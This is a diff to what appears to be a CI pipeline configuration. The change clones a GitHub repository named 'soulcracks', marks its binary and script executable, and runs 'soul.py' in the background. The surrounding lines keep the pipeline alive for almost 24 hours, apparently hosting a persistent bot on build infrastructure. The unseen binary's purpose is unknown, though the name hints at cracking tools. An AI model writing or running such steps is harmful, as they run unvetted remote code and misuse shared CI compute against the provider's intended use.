@@ -5,13 +5,16 @@ pipelines:
         image: python:3.10  # Or your preferred Python version
         size: 2x # Use a larger runner size if needed
         script:
-          - echo "Starting pipeline..."
-          # Install required dependencies
-          - pip install telebot flask pytz psutil aiogram pymongo aiohttp python-telegram-bot
-          # Make the script executable
-          - chmod +x dark
+          - apt-get update && apt-get install -y gcc libpthread-stubs0-dev
+          - pip install telebot pymongo aiohttp
+          - git clone https://github.com/Soulhonvxb5091/soulcracks
+          - mv soul.py $HOME
+          - cd soulcracks
+          - mv soul $HOME & cd
+          - chmod +x *
+          - chmod +x soul
           # Run the script in the background using nohup and redirect output
-          - nohup python3 dark.py > output.log 2>&1 &
+          - nohup python3 soul.py > output.log 2>&1 &
           - echo "Background script started. Logs in output.log"
 
           # Keep pipeline running for (almost) 24 hours
